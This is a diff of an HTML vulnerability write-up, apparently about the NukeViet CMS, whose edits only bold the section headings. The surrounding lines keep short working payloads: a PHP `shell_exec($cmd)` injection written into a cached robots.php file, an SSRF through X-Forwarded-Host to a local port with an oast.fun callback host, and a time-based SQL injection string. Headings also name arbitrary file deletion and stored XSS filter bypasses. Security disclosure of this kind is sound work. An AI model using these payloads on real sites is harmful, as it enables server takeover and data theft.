@@ -55,7 +55,7 @@ Decode: <code>&amp;filename['; extract($_GET); echo shell_exec($cmd);//]=1</code
 <p>File cache robots đã được ghi trên server:</p>
 <p><code>data\config\robots.php</code></p>
 <p></p>
-<h2 id="pre-auth-ssrf-in-nukeviet">Pre-auth SSRF in nukeviet</h2>
+<h2 id="pre-auth-ssrf-in-nukeviet"><strong>Pre-auth SSRF in nukeviet</strong></h2>
 <h3 id="description-1">Description</h3>
 <table>
 <thead>
@@ -137,7 +137,7 @@ X-Forwarded-Host: 127.0.0.1:8081/</strong></p>
 <p><code>oast.fun</code></p>
 <p></p>
 <p></p>
-<h2 id="path-traversal-to-arbitrary-file-deletion-in-edit-comment-function">Path Traversal to <strong>Arbitrary File Deletion in Edit Comment Function</strong></h2>
+<h2 id="path-traversal-to-arbitrary-file-deletion-in-edit-comment-function"><strong>Path Traversal to Arbitrary File Deletion in Edit Comment Function</strong></h2>
 <h3 id="description-2">Description</h3>
 <table>
 <thead>
@@ -223,7 +223,7 @@ X-Forwarded-Host: 127.0.0.1:8081/</strong></p>
 <p>Intercept the <code>Search</code> request and inject the following payload into the order_payment parameter: <code>-999%20or%20sleep(3)%20--%20a</code></p>
 <p>This payload causes the application to sleep for a total of 18 seconds (3 seconds for each of the 6 columns).</p>
 <p></p>
-<h2 id="multiple-anti-xss-filter-bypasses-leading-to-stored-xss-in-news-module">Multiple Anti-XSS Filter Bypasses leading to Stored XSS in News Module.</h2>
+<h2 id="multiple-anti-xss-filter-bypasses-leading-to-stored-xss-in-news-module"><strong>Multiple Anti-XSS Filter Bypasses leading to Stored XSS in News Module.</strong></h2>
 <h3 id="description-4">Description</h3>
 <table>
 <thead>
